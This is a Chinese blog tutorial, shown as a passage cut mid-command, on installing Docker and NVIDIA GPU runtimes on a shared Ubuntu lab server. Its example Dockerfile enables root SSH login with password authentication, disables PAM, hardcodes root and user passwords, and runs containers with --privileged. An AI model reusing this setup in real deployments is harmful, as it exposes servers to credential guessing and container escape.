    <content type="html"><![CDATA[<p>怎么实验室只有👴一个运维</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><blockquote><p>因为笔者目前所在的实验室好像只有笔者一个人会一点点运维技术，<del>大家都喜欢在根目录和各种乱七八糟的目录到处乱拉</del>（错乱），为了保证服务器环境不会哪天用着用着给整个挂掉了，笔者写了一份《服务器安全使用指北》，并顺便拷贝过来水一篇博客（笑）</p></blockquote><h2 id="What-is-docker"><a href="#What-is-docker" class="headerlink" title="What is docker?"></a>What is docker?</h2><blockquote><p>抄自 Wikipedia：</p><p><a href="https://www.docker.com/">Docker</a> 是一个开源的开放平台软件，用于开发应用、交付（shipping）应用和运行应用。Docker 允许用户将基础设施（Infrastructure）中的应用单独分割出来，形成更小的颗粒（容器），从而提高交付软件的速度。</p></blockquote><p>按照笔者的理解，Docker 可以简单理解为用于创建<strong>共享操作系统内核虚拟机隔离环境</strong>（称为容器）的工具包：</p><p><img src="https://s2.loli.net/2023/08/31/MYFEIkeyz5iR9t4.png"></p><h2 id="Why-use-docker"><a href="#Why-use-docker" class="headerlink" title="Why use docker?"></a>Why use docker?</h2><p>为了解决服务器环境污染问题（例如配环境把服务器主环境搞崩了，这将同时影响到使用服务器的多个用户），在服务器多人共享的情况下，对于<strong>不涉及内核驱动更改的工作</strong>，推荐使用 docker 创建一个新的隔离环境来完成。</p><h2 id="How-to-install-docker"><a href="#How-to-install-docker" class="headerlink" title="How to install docker?"></a>How to install docker?</h2><blockquote><p><strong>推荐参照官网的安装教程来完成，这里笔者也是使用的官网教程进行安装</strong></p><p>笔者实验室服务器安装了 Ubuntu，其他发行版请参见<a href="https://docs.docker.com/engine/install/ubuntu/">官网教程</a>进行安装</p></blockquote><h3 id="Docker-Engine（推荐）"><a href="#Docker-Engine（推荐）" class="headerlink" title="Docker Engine（推荐）"></a>Docker Engine（推荐）</h3><p>首先通过如下命令卸载可能存在的旧版 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-keyword">for</span> pkg <span class="hljs-keyword">in</span> docker.io docker-doc docker-compose podman-docker containerd runc; <span class="hljs-keyword">do</span> sudo apt-get remove <span class="hljs-variable">$pkg</span>; <span class="hljs-keyword">done</span></span><br></code></pre></td></tr></table></figure><p>接下来添加 docker 仓库的 GPG key 并进行配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install ca-certificates curl gnupg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo install -m 0755 -d /etc/apt/keyrings</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chmod</span> a+r /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> \</span><br><span class="language-bash">  <span class="hljs-string">&quot;deb [arch=&quot;</span>$(dpkg --print-architecture)<span class="hljs-string">&quot; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="hljs-string"><span class="language-bash">  &quot;</span>$(. /etc/os-release &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$VERSION_CODENAME</span>&quot;</span>)<span class="hljs-string">&quot; stable&quot;</span> | \</span><br><span class="language-bash">  sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br></code></pre></td></tr></table></figure><p>正式安装 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></code></pre></td></tr></table></figure><p>完成之后可以通过如下命令验证是否安装成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run hello-world</span><br></code></pre></td></tr></table></figure><p>将当前用户添加到 docker 用户组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo groupadd docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -aG docker <span class="hljs-variable">$USER</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h3 id="Docker-Desktop（不推荐）"><a href="#Docker-Desktop（不推荐）" class="headerlink" title="Docker Desktop（不推荐）"></a><em>Docker Desktop（不推荐）</em></h3><blockquote><p> Docker Desktop 额外提供了一个 GUI，以及不同用户间的隔离机制，不过 <em>笔者用着感觉不是很 ok</em> ，所以还是推荐传统的纯 Docker Engine</p></blockquote><p>对于非 Gnome 桌面环境而言，需要安装 <code>gnome-terminal</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install gnome-terminal</span><br></code></pre></td></tr></table></figure><p>卸载可能安装过的 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt remove docker-desktop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">rm</span> -r <span class="hljs-variable">$HOME</span>/.docker/desktop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">rm</span> /usr/local/bin/com.docker.cli</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt purge docker-desktop</span><br></code></pre></td></tr></table></figure><p>设置 docker 仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install ca-certificates curl gnupg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo install -m 0755 -d /etc/apt/keyrings</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chmod</span> a+r /etc/apt/keyrings/docker.gpg</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> \</span><br><span class="language-bash">  <span class="hljs-string">&quot;deb [arch=&quot;</span>$(dpkg --print-architecture)<span class="hljs-string">&quot; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="hljs-string"><span class="language-bash">  &quot;</span>$(. /etc/os-release &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$VERSION_CODENAME</span>&quot;</span>)<span class="hljs-string">&quot; stable&quot;</span> | \</span><br><span class="language-bash">  sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br></code></pre></td></tr></table></figure><p>下载 docker 安装包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://desktop.docker.com/linux/main/amd64/docker-desktop-4.22.1-amd64.deb</span><br></code></pre></td></tr></table></figure><p>安装 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install ./docker-desktop-4.22.1-amd64.deb</span><br></code></pre></td></tr></table></figure><p>启动 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl --user start docker-desktop</span><br></code></pre></td></tr></table></figure><p>将当前用户添加到 docker 用户组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo groupadd docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo usermod -aG docker <span class="hljs-variable">$USER</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl --user restart docker-desktop</span><br></code></pre></td></tr></table></figure><h1 id="0x01-使用-docker-搭建基本的容器环境"><a href="#0x01-使用-docker-搭建基本的容器环境" class="headerlink" title="0x01. 使用 docker 搭建基本的容器环境"></a>0x01. 使用 docker 搭建基本的容器环境</h1><p><strong>若用户未加入 docker 用户组则所有命令开头都需要添加</strong> <strong>sudo</strong> <strong>获得 root 权限</strong></p><h2 id="创建-Docker-镜像"><a href="#创建-Docker-镜像" class="headerlink" title="创建 Docker 镜像"></a>创建 Docker 镜像</h2><p>首先在一个空白的文件夹中创建一个名为 <code>Dockerfile</code> 的文件，写入如下内容：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-comment"># 可以在这里预先添加想要安装的软件</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get -y update &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 apt-transport-https python3 git \</span><br><span class="language-bash">    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \</span><br><span class="language-bash">    vim netcat openssh-server unzip make wget bison flex build-essential curl</span><br><br><span class="hljs-comment"># 开启ssh登录</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -ri <span class="hljs-string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># 设置允许密码登录</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># 添加用户密码，这里只是一个示例，根据你的需求自己修改</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd arttnba3 &amp;&amp; \</span><br><span class="language-bash">    useradd -g arttnba3 arttnba3 -m &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3:lTaa4cqucW4zxvJswU5KH0HIRM9VmjO7&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:rqUHmfGUtjItWapDuv3NEqwQ9bm6GBrs&quot;</span> | chpasswd</span><br><br><span class="hljs-comment"># 添加 ssh 登录，注意换成自己新建的用户的用户名</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/arttnba3/.ssh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;这里写你的ssh公钥&quot;</span> &gt; /home/arttnba3/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># 保持 docker 容器运行</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p>接下来运行以下命令创建镜像：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t <span class="hljs-string">&quot;自定义镜像名&quot;</span> .</span><br></code></pre></td></tr></table></figure><h2 id="创建并启动-docker-容器"><a href="#创建并启动-docker-容器" class="headerlink" title="创建并启动 docker 容器"></a>创建并启动 <strong>docker 容器</strong></h2><p>完成 docker 镜像创建之后接下来我们就可以开始使用该镜像启动一个新的容器，使用如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> 自定义镜像名</span><br></code></pre></td></tr></table></figure><p>这里添加了一个服务器端口到容器内部 <code>22</code> 端口的映射，从而使得可以从外部直接通过 ssh 连接到容器内部</p><p>如果你的容器不需要主机相关的一些权限，也可以去掉 <code>--privileged</code> 参数</p><h2 id="进入-docker-容器"><a href="#进入-docker-容器" class="headerlink" title="进入 docker 容器"></a>进入 docker 容器</h2><p>进入容器环境有两种办法，一种是通过 container id（可以通过 <code>docker ps</code> 查看，在创建容器时也会打印出容器id），另一种是通过自定义的容器名，这里进入容器后默认是 root 用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -it 容器名或容器ID /bin/bash</span><br></code></pre></td></tr></table></figure><p>如果想要以容器内部的指定用户身份进入容器，使用如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -u 用户名 -it 容器名或容器ID /bin/bash</span><br></code></pre></td></tr></table></figure><h2 id="从外部连接-docker-容器"><a href="#从外部连接-docker-容器" class="headerlink" title="从外部连接 docker 容器"></a>从外部连接 docker 容器</h2><p>在启动容器时我们已经指定了一个外部端口映射，可以直接通过该端口进行 ssh 连接，操作和正常登录服务器基本一致，不过要手动指定该外部端口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh 容器内用户名@服务器主机名或IP -p 自定义的外部端口</span><br></code></pre></td></tr></table></figure><h2 id="删除-docker-容器"><a href="#删除-docker-容器" class="headerlink" title="删除 docker 容器"></a><strong>删除 docker 容器</strong></h2><p>如果 docker 内环境配崩了不想要了，可以简单通过如下命令将该容器进行删除：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker stop 容器ID或容器名</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">rm</span> 容器ID或容器名</span><br></code></pre></td></tr></table></figure><p>重新创建新的容器环境可以直接回到第二步继续进行</p><h2 id="删除-docker-镜像"><a href="#删除-docker-镜像" class="headerlink" title="删除 docker 镜像"></a>删除 docker 镜像</h2><p>如果 docker 镜像构建感觉不够好，可以通过如下命令删除对应镜像（需确保没有容器在使用该镜像）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker rmi 镜像名</span><br></code></pre></td></tr></table></figure><p>后续使用则需要回到第一步从头开始</p><h1 id="0x02-创建可以使用显卡的-docker-环境"><a href="#0x02-创建可以使用显卡的-docker-环境" class="headerlink" title="0x02. 创建可以使用显卡的 docker 环境"></a>0x02. 创建可以使用显卡的 docker 环境</h1><p>有的时候会存在需要在显卡上跑一些任务的需求，本节讲述如何创建一个挂载了显卡的 docker 容器</p><h2 id="What-is-NVIDIA-Container-Toolkit"><a href="#What-is-NVIDIA-Container-Toolkit" class="headerlink" title="What is NVIDIA Container Toolkit ?"></a>What is <code>NVIDIA Container Toolkit</code> ?</h2><p><a href="https://github.com/NVIDIA/nvidia-container-toolkit">NVIDIA Container Toolkit</a> 是由英伟达开发的一套对 docker 进行包装的工具，从而使得 docker 容器可以使用服务器主机上的显卡</p><p><img src="https://s2.loli.net/2023/08/31/dWpAu8LJQ2bOShg.png" alt="image.png"></p><h2 id="安装-NVIDIA-Container-Toolk"><a href="#安装-NVIDIA-Container-Toolk" class="headerlink" title="安装 NVIDIA Container Toolk"></a>安装 NVIDIA Container Toolk</h2><p>有两种方法：</p><h4 id="方法-①"><a href="#方法-①" class="headerlink" title="方法 ①"></a>方法 ①</h4><p>需要在服务器主机上完成，首先使用如下命令安装基本组件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update \</span><br><span class="language-bash">    &amp;&amp; sudo apt-get install -y nvidia-container-toolkit-base</span><br></code></pre></td></tr></table></figure><p>使用如下命令检查是否安装成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nvidia-ctk --version</span><br></code></pre></td></tr></table></figure><p>接下来使用如下命令生成 CDI （Container Device Interface）规范文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk cdi generate --output=/etc/cdi/nvidia.yaml</span><br></code></pre></td></tr></table></figure><p>添加 NVIDIA 仓库与 GPG 密钥：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">distribution=$(. /etc/os-release;<span class="hljs-built_in">echo</span> $ID<span class="hljs-variable">$VERSION_ID</span>) \</span><br><span class="language-bash">      &amp;&amp; curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | sudo gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg \</span><br><span class="language-bash">      &amp;&amp; curl -s -L https://nvidia.github.io/libnvidia-container/<span class="hljs-variable">$distribution</span>/libnvidia-container.list | \</span><br><span class="language-bash">            sed <span class="hljs-string">&#x27;s#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g&#x27;</span> | \</span><br><span class="language-bash">            sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/nvidia-container-toolkit.list</span><br></code></pre></td></tr></table></figure><p>安装 toolkit：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y nvidia-container-toolkit</span><br></code></pre></td></tr></table></figure><p>配置 docker daemon 进程以识别 NVIDIA COntainer Runtime：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk runtime configure --runtime=docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><p>测试是否安装成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run --<span class="hljs-built_in">rm</span> --runtime=nvidia --gpus all nvidia/cuda:11.6.2-base-ubuntu20.04 nvidia-smi</span><br></code></pre></td></tr></table></figure><p>最后成功输出和 <code>nvidia-smi</code> 命令一样的结果就说明安装成功了：</p><p><img src="https://s2.loli.net/2023/08/31/6BVStUv9jeCuimM.png" alt="image.png"></p><h4 id="方法-②"><a href="#方法-②" class="headerlink" title="方法 ②"></a>方法 ②</h4><blockquote><p>参见 <a href="https://github.com/NVIDIA/nvidia-docker/issues/1238">Github 上的这个 issue</a></p></blockquote><p>若方法 ① 没法成功进行，可以使用如下命令进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">distribution=$(. /etc/os-release;<span class="hljs-built_in">echo</span> $ID<span class="hljs-variable">$VERSION_ID</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s -L https://nvidia.github.io/nvidia-docker/<span class="hljs-variable">$distribution</span>/nvidia-docker.list | sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/nvidia-docker.list</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update &amp;&amp; sudo apt-get install -y nvidia-container-toolkit</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h2 id="添加-NVIDIA-Rumtime"><a href="#添加-NVIDIA-Rumtime" class="headerlink" title="添加 NVIDIA Rumtime"></a>添加 NVIDIA Rumtime</h2><p>NVIDIA Container Runtime 的添加一共有三种方法</p><h4 id="方法-①-1"><a href="#方法-①-1" class="headerlink" title="方法 ①"></a>方法 ①</h4><p>首先创建配置文件夹：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.d</span><br></code></pre></td></tr></table></figure><p>然后创建配置文件，注意这条命令一共有五行，全部复制后粘贴进去：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">tee</span> /etc/systemd/system/docker.service.d/override.conf &lt;&lt;<span class="hljs-string">EOF</span></span><br>[Service]<br>ExecStart=<br>ExecStart=/usr/bin/dockerd --host=fd:// --add-runtime=nvidia=/usr/bin/nvidia-container-runtime<br>EOF<br></code></pre></td></tr></table></figure><p>重启 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h4 id="方法-②-1"><a href="#方法-②-1" class="headerlink" title="方法 ②"></a>方法 ②</h4><p>Nvidia toolkit 安装成功之后也可以辅助我们完成这一步，通过如下两条命令其中之一完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk runtime configure --runtime=docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk runtime configure --runtime=docker --set-as-default <span class="hljs-comment"># 设置为默认</span></span><br></code></pre></td></tr></table></figure><p>重启 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h4 id="方法-③"><a href="#方法-③" class="headerlink" title="方法 ③"></a>方法 ③</h4><p>也可以使用 docker 直接添加 NVIDIA Runtime：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dockerd --add-runtime=nvidia=/usr/bin/nvidia-container-runtime [...]</span><br></code></pre></td></tr></table></figure><h2 id="配置带-CUDA-的-docker-镜像"><a href="#配置带-CUDA-的-docker-镜像" class="headerlink" title="配置带 CUDA 的 docker 镜像"></a>配置带 CUDA 的 docker 镜像</h2><h2 id="创建并启动带显卡的-Docker-容器"><a href="#创建并启动带显卡的-Docker-容器" class="headerlink" title="创建并启动带显卡的 Docker 容器"></a>创建并启动带显卡的 Docker 容器</h2><p>与 <code>0x01</code> 中的创建 docker 容器的步骤基本相同，不过需要添加额外的参数</p><blockquote><p>更多用法参见 <a href="https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/user-guide.html%EF%BC%8C%E6%9C%AC%E6%96%87%E4%BB%85%E5%B1%95%E7%A4%BA%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95">https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/user-guide.html，本文仅展示基本用法</a></p></blockquote><h3 id="使用-Nvidia-Runtime"><a href="#使用-Nvidia-Runtime" class="headerlink" title="使用 Nvidia Runtime"></a>使用 Nvidia Runtime</h3><ul><li>容器内挂载所有的显卡</li></ul><p>通过额外添加 <code>--runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=all</code> 参数完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> --runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=all 自定义镜像名</span><br></code></pre></td></tr></table></figure><ul><li>容器内挂载指定显卡</li></ul><p>通过额外添加 <code>--runtime=nvidia -e 